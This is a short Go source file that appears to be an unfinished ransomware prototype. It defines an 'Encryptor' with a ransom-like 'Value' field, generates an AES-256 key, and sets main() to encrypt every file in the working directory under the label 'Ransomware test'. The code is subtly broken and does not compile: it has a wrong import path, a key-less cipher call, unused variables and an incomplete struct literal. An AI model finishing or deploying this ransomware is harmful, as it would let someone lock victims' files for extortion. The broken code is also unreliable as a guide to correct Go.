package main

import (
	"crypto/aes"
	"fmt"
	"io/fs"
	"io/ioutil"
	"log"
	"rand"
)

type Encryptor struct {
	Files []fs.FileInfo
	Name  string
	Value float32
	key   *[]byte
	UID   string
	IP    string
}

func CreateEncryptor(files []fs.FileInfo, name string, value float32) Encryptor {
	bytes := make([]byte, 32) //generate a random 32 byte key for AES-256
	if _, err := rand.Read(bytes); err != nil {
		panic(err.Error())
	}

	return Encryptor{Files: files, Name: name, Value: value, key: &bytes}
}

func (e *Encryptor) EncryptFiles() error {
	for _, f := range e.Files {
		file, err := ioutil.ReadFile(f.Name())
		if err != nil {
			log.Fatal(err)
		}

		block, err := aes.NewCipher()
		if err != nil {
			log.Panic(err)
		}

	}

	return nil
}

func main() {
	fmt.Println("!!!! WHY DID YOU RUN THIS FILE !!!!")
	files, err := ioutil.ReadDir("./")
	if err != nil {
		log.Fatalf("Error reading files from directory: %v", err)
	}

	encryptor := Encryptor{files, "Ransomware test", 1000.0}
	encryptor.EncryptFiles()
}
